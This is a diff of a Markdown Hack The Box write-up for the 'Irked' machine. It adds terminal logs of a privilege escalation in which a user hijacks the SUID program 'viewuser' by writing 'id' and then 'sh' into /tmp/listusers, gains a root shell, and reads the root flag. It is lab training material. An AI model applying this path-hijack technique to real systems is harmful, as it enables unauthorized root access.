@@ -1,4 +1,4 @@
-# Hack The Box - Poison Walkthrough w/o Metasploit
+# Hack The Box - Irked Walkthrough w/o Metasploit
 
 ## Reconnaissance
 Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.
@@ -343,3 +343,43 @@ sh: 1: /tmp/listusers: Permission denied
 ```
 
 
+```
+djmardov@irked:/$ echo "test" > /tmp/listusers
+djmardov@irked:/$ viewuser 
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2023-03-05 05:21 (:0)
+djmardov pts/0        2023-03-05 05:22 (10.10.14.36)
+sh: 1: /tmp/listusers: Permission denied
+```
+
+
+```
+djmardov@irked:/$ chmod +x /tmp/listusers 
+djmardov@irked:/$ echo id > /tmp/listusers 
+djmardov@irked:/$ viewuser 
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2023-03-05 05:21 (:0)
+djmardov pts/0        2023-03-05 05:22 (10.10.14.36)
+uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
+```
+
+
+```
+djmardov@irked:/$ echo sh > /tmp/listusers
+djmardov@irked:/$ viewuser 
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2023-03-05 05:21 (:0)
+djmardov pts/0        2023-03-05 05:22 (10.10.14.36)
+# whoami
+root
+```
+
+Grabbing root flag.
+
+```
+# cat /root/root.txt
+[REDACTED]
+```
